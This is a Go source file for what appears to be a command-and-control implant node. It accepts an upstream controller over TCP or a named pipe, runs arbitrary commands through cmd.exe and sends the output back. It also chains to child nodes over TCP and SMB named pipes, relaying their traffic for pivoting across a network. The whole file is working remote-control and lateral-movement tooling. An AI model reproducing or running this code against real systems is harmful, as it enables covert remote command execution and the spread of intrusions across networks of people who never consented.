package main

import (
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"sync"
	"time"
)

type Node struct {
	ID string

	mu       sync.RWMutex
	upstream *Link
	children map[string]*Link
}

func NewNode(id string) *Node {
	return &Node{
		ID:       id,
		children: make(map[string]*Link),
	}
}

func (n *Node) Run(tcpListen string, pipeListen string) error {
	started := false
	if tcpListen != "" {
		started = true
		go func() {
			if err := listenTCP(tcpListen, n.acceptUpstream); err != nil {
				fmt.Printf("[node:%s] tcp listener failed: %v\n", n.ID, err)
			}
		}()
	}
	if pipeListen != "" {
		started = true
		go func() {
			if err := listenPipe(pipeListen, n.acceptUpstream); err != nil {
				fmt.Printf("[node:%s] pipe listener failed: %v\n", n.ID, err)
			}
		}()
	}
	if !started {
		return fmt.Errorf("node requires --tcp-listen or --pipe")
	}

	fmt.Printf("[node:%s] ready\n", n.ID)
	select {}
}

func (n *Node) acceptUpstream(conn net.Conn, kind string, endpoint string) {
	link := &Link{ID: "upstream", Kind: kind, Endpoint: endpoint, Conn: conn}
	n.setUpstream(link)

	hello := Message{
		Cmd:  CmdHello,
		Src:  n.ID,
		Body: []byte(fmt.Sprintf("id=%s kind=%s time=%s", n.ID, kind, time.Now().Format(time.RFC3339))),
	}
	if err := link.Write(hello); err != nil {
		fmt.Printf("[node:%s] send hello failed: %v\n", n.ID, err)
		link.Close()
		return
	}

	fmt.Printf("[node:%s] upstream connected via %s (%s)\n", n.ID, kind, endpoint)
	n.readUpstream(link)
}

func (n *Node) setUpstream(link *Link) {
	n.mu.Lock()
	defer n.mu.Unlock()
	if n.upstream != nil {
		n.upstream.Close()
	}
	n.upstream = link
}

func (n *Node) getUpstream() *Link {
	n.mu.RLock()
	defer n.mu.RUnlock()
	return n.upstream
}

func (n *Node) readUpstream(link *Link) {
	for {
		msg, _, err := readFrame(link.Conn)
		if err != nil {
			fmt.Printf("[node:%s] upstream closed: %v\n", n.ID, err)
			return
		}
		fmt.Printf("[node:%s] <- upstream %s child=%s len=%d\n", n.ID, cmdName(msg.Cmd), msg.Child, len(msg.Body))
		n.handleUpstreamMessage(msg)
	}
}

func (n *Node) handleUpstreamMessage(msg Message) {
	switch msg.Cmd {
	case CmdExec:
		n.handleExec(msg)
	case CmdConnectTCP:
		n.handleConnectTCP(msg.Child, string(msg.Body))
	case CmdLinkSMB:
		n.handleLinkSMB(msg.Child, string(msg.Body))
	case CmdRoute:
		n.routeToChild(msg.Child, msg.Body)
	case CmdPing:
		n.sendUpstream(Message{Cmd: CmdPing, Src: n.ID, Body: []byte("pong")})
	default:
		n.sendUpstream(Message{
			Cmd:  CmdResult,
			Src:  n.ID,
			Body: []byte(fmt.Sprintf("unsupported command: %s", cmdName(msg.Cmd))),
		})
	}
}

func (n *Node) handleExec(msg Message) {
	cmdline := string(msg.Body)
	fmt.Printf("[node:%s] exec: %s\n", n.ID, cmdline)

	cmd := exec.Command("cmd.exe", "/c", cmdline)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil {
		out.WriteString("\n[error] ")
		out.WriteString(err.Error())
		out.WriteByte('\n')
	}

	n.sendUpstream(Message{
		Cmd:    CmdResult,
		TaskID: msg.TaskID,
		Src:    n.ID,
		Body:   out.Bytes(),
	})
}

func (n *Node) handleConnectTCP(childID string, addr string) {
	fmt.Printf("[node:%s] connect tcp child=%s addr=%s\n", n.ID, childID, addr)
	conn, err := dialTCP(addr)
	if err != nil {
		n.reportOpenFailure(childID, "tcp", addr, err)
		return
	}
	n.registerChild(childID, "tcp", addr, conn)
}

func (n *Node) handleLinkSMB(childID string, pipe string) {
	fmt.Printf("[node:%s] link smb child=%s pipe=%s\n", n.ID, childID, pipe)
	conn, err := dialPipe(pipe)
	if err != nil {
		n.reportOpenFailure(childID, "smb", pipe, err)
		return
	}
	n.registerChild(childID, "smb", pipe, conn)
}

func (n *Node) registerChild(expectedID string, kind string, endpoint string, conn net.Conn) {
	msg, _, err := readFrame(conn)
	if err != nil {
		n.reportOpenFailure(expectedID, kind, endpoint, err)
		_ = conn.Close()
		return
	}
	if msg.Cmd != CmdHello {
		n.reportOpenFailure(expectedID, kind, endpoint, fmt.Errorf("expected HELLO, got %s", cmdName(msg.Cmd)))
		_ = conn.Close()
		return
	}

	childID := msg.Src
	if childID == "" {
		childID = expectedID
	}
	link := &Link{ID: childID, Kind: kind, Endpoint: endpoint, Conn: conn}

	n.mu.Lock()
	if old := n.children[childID]; old != nil {
		old.Close()
	}
	n.children[childID] = link
	n.mu.Unlock()

	fmt.Printf("[node:%s] child open id=%s kind=%s endpoint=%s\n", n.ID, childID, kind, endpoint)
	n.sendUpstream(Message{
		Cmd:   CmdOpen,
		Src:   n.ID,
		Child: childID,
		Body:  []byte(fmt.Sprintf("kind=%s endpoint=%s hello=%s", kind, endpoint, string(msg.Body))),
	})

	go n.readChild(link)
}

func (n *Node) readChild(link *Link) {
	for {
		msg, raw, err := readFrame(link.Conn)
		if err != nil {
			fmt.Printf("[node:%s] child %s closed: %v\n", n.ID, link.ID, err)
			n.removeChild(link.ID)
			n.sendUpstream(Message{Cmd: CmdDead, Src: n.ID, Child: link.ID, Body: []byte(err.Error())})
			return
		}
		fmt.Printf("[node:%s] <- child=%s %s len=%d\n", n.ID, link.ID, cmdName(msg.Cmd), len(msg.Body))
		n.sendUpstream(Message{Cmd: CmdRead, Src: n.ID, Child: link.ID, Body: raw})
	}
}

func (n *Node) routeToChild(childID string, raw []byte) {
	n.mu.RLock()
	link := n.children[childID]
	n.mu.RUnlock()
	if link == nil {
		n.sendUpstream(Message{
			Cmd:   CmdDead,
			Src:   n.ID,
			Child: childID,
			Body:  []byte("child channel not found"),
		})
		return
	}
	if err := link.WriteRaw(raw); err != nil {
		n.removeChild(childID)
		n.sendUpstream(Message{
			Cmd:   CmdDead,
			Src:   n.ID,
			Child: childID,
			Body:  []byte(err.Error()),
		})
	}
}

func (n *Node) removeChild(childID string) {
	n.mu.Lock()
	defer n.mu.Unlock()
	if link := n.children[childID]; link != nil {
		link.Close()
		delete(n.children, childID)
	}
}

func (n *Node) reportOpenFailure(childID string, kind string, endpoint string, err error) {
	n.sendUpstream(Message{
		Cmd:   CmdDead,
		Src:   n.ID,
		Child: childID,
		Body:  []byte(fmt.Sprintf("open %s %s failed: %v", kind, endpoint, err)),
	})
}

func (n *Node) sendUpstream(msg Message) {
	up := n.getUpstream()
	if up == nil {
		fmt.Printf("[node:%s] no upstream for %s\n", n.ID, cmdName(msg.Cmd))
		return
	}
	if err := up.Write(msg); err != nil {
		fmt.Printf("[node:%s] send upstream failed: %v\n", n.ID, err)
	}
}
